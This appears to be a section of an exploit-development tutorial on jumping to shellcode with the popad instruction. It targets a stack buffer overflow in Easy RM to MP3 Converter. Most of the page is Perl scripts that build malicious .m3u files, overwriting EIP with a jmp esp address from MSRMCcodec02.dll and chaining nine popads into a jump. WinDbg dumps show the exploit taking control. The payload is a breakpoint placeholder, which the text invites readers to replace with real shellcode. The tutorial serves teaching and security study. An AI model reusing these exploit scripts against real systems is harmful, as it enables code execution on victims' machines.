<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Some Other Ways To Jump</title>
</head><body><ul><li>popad</li>
<li>hardcode address to jump to</li>
</ul>
<br/>
the “popap” instruction may help us ‘jumping’ to our shellcode as well. popad (pop all double) will pop double words from the stack (ESP) into the general-purpose registers, in one action. The registers are loaded in the following order : EDI, ESI, EBP, EBX, EDX, ECX and EAX.� As a result, the ESP register is incremented after each register is loaded (triggered by the popad). One popad will thus take 32 bytes from ESP and pops them in the registers in an orderly fashion.<br/>
<br/>
The popad opcode is 0x61<br/>
<br/>
So suppose you need to jump 40 bytes, and you only have a couple of bytes to make the jump, you can issue 2 popad’s to point ESP to the shellcode (which starts with NOPs to make up for the (2 times 32 bytes – 40 bytes of space that we need to jump over))<br/>
<br/>
Let’s use the Easy RM to MP3 vulnerability again to demonstrate this technique :<br/>
<br/>
We’ll reuse one of the script example from earlier in this post, and we’ll build a fake buffer that will put 13 X’s at ESP, then we’ll pretend there is some garbage (D’s and A’s) and then place to put our shellcode (NOPS + A’s)<br/>
<br/>
We’ll reuse one of the script example from earlier in this post, and we’ll build a fake buffer that will put 13 X’s at ESP, then we’ll pretend there is some garbage (D’s and A’s) and then place to put our shellcode (NOPS + A’s)<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;A&quot; x 250;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
my $shellcode = &quot;\xcc&quot;;<br/>
<br/>
my $restofbuffer = &quot;A&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = &quot;BBBB&quot;;<br/>
my $preshellcode = &quot;X&quot; x 17; #let's pretend this is the only space we have available<br/>
my $garbage = &quot;\x44&quot; x 100; #let’s pretend this is the space we need to jump over<br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$garbage;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
�<br/>
<br/>
After opening the file in Easy RM to MP3, the application dies, and ESP looks like this :<br/>
<br/>
First chance exceptions are reported before any exception handling.<br/>
This exception may be expected and handled.<br/>
eax=00000001 ebx=00104a58 ecx=7c91005d edx=003f0000 esi=77c5fce0 edi=0000666d<br/>
eip=42424242 esp=000ff730 ebp=00344158 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00010206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0x42424231:<br/>
42424242 ??       ???<br/>
0:000&gt; d esp<br/>
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 44 44 44 XXXXXXXXXXXXXDDD | =&gt; 13 bytes<br/>
000ff740 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff750 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff760 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff770 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff780 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff790 44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44 DDDDDDDDDDDDDDDD | =&gt; garbage<br/>
000ff7a0 00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 .AAAAAAAAAAAAAAA | =&gt; garbage<br/>
0:000&gt; d<br/>
000ff7b0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7c0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7d0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7e0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff7f0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff800 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff810 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff820 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
0:000&gt; d<br/>
000ff830 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; garbage<br/>
000ff840 41 41 90 90 90 90 90 90-90 90 90 90 90 90 90 90 AA.............. | =&gt; garbage<br/>
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ | =&gt; NOPS/Shellcode<br/>
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................ | =&gt; NOPS/Shellcode<br/>
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA | =&gt; NOPS/Shellcode<br/>
<br/>
Let’s pretend that we need to use the 13 X’s (so 13 bytes) that are available directly at ESP to jump over 100 D’s (44) and 160 A’s (so a total of 260 bytes) to end up at our shellcode (starts with NOPs, then a breakpoint, and then A’s (=shellcode))<br/>
<br/>
One popad = 32 bytes. So 260 bytes = 9 popad’s (-28 bytes)<br/>
<br/>
(so we need to start our shellcode with nops, or start the shellcode at [start of shellcode]+28 bytes<br/>
<br/>
In our case, we have put some nops before the shellcode, so let’s try to “popad” into the nops and see if the application breaks at our breakpoint.<br/>
<br/>
First, overwrite EIP again with jmp esp. (see one of the previous exploit scripts)<br/>
<br/>
Then, instead of the X’s, perform 9 popad’s, followed by “jmp esp” opcode (0xff,0xe4)<br/>
<br/>
my $file= &quot;test1.m3u&quot;;<br/>
my $buffersize = 26094;<br/>
<br/>
my $junk= &quot;A&quot; x 250;<br/>
my $nop = &quot;\x90&quot; x 50;<br/>
my $shellcode = &quot;\xcc&quot;;<br/>
<br/>
my $restofbuffer = &quot;A&quot; x ($buffersize-(length($junk)+length($nop)+length($shellcode)));<br/>
<br/>
my $eip = pack('V',0x01ccf23a); #jmp esp from MSRMCcodec02.dll<br/>
<br/>
my $preshellcode = &quot;X&quot; x 4; # needed to point ESP at next 13 bytes below<br/>
$preshellcode=$preshellcode.&quot;\x61&quot; x 9; #9 popads<br/>
$preshellcode=$preshellcode.&quot;\xff\xe4&quot;; #10th and 11th byte, jmp esp<br/>
$preshellcode=$preshellcode.&quot;\x90\x90\x90&quot;; #fill rest with some nops<br/>
<br/>
my $garbage = &quot;\x44&quot; x 100; #garbage to jump over <br/>
<br/>
my $buffer = $junk.$nop.$shellcode.$restofbuffer;<br/>
<br/>
print &quot;Size of buffer : &quot;.length($buffer).&quot;\n&quot;;<br/>
<br/>
open($FILE,&quot;&gt;$file&quot;);<br/>
print $FILE $buffer.$eip.$preshellcode.$garbage;<br/>
close($FILE);<br/>
print &quot;m3u File Created successfully\n&quot;;<br/>
<br/>
After opening the file, the application does indeed break at the breakpoint. EIP and ESP look like this :<br/>
<br/>
f40.5f0): Break instruction exception - code 80000003 (first chance)<br/>
eax=90909090 ebx=90904141 ecx=90909090 edx=90909090 esi=41414141 edi=41414141<br/>
eip=000ff874 esp=000ff850 ebp=41414141 iopl=0     nv up ei pl nz na pe nc<br/>
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000       efl=00000206<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
Missing image name, possible paged-out or corrupt data.<br/>
+0xff863:<br/>
000ff874 cc       int   3<br/>
0:000&gt; d eip<br/>
000ff874 cc 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 .AAAAAAAAAAAAAAA<br/>
000ff884 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff894 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8a4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8b4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8c4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8d4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8e4 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
0:000&gt; d eip-32<br/>
000ff842 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff852 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff862 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff872 90 90 cc 41 41 41 41 41-41 41 41 41 41 41 41 41 ...AAAAAAAAAAAAA<br/>
000ff882 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff892 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8a2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8b2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
0:000&gt; d esp<br/>
000ff850 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff860 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................<br/>
000ff870 90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41 .....AAAAAAAAAAA<br/>
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8b0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
000ff8c0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA<br/>
<br/>
=&gt; the popad’s have worked and made esp point at the nops. Then the jump to esp was made (0xff 0xe4), which made EIP jump to nops, and slide to the breakpoint (at 000f874)<br/>
<br/>
Replace the A’s with real shellcode :<br/>
pnwed again !<br/>
</body></html>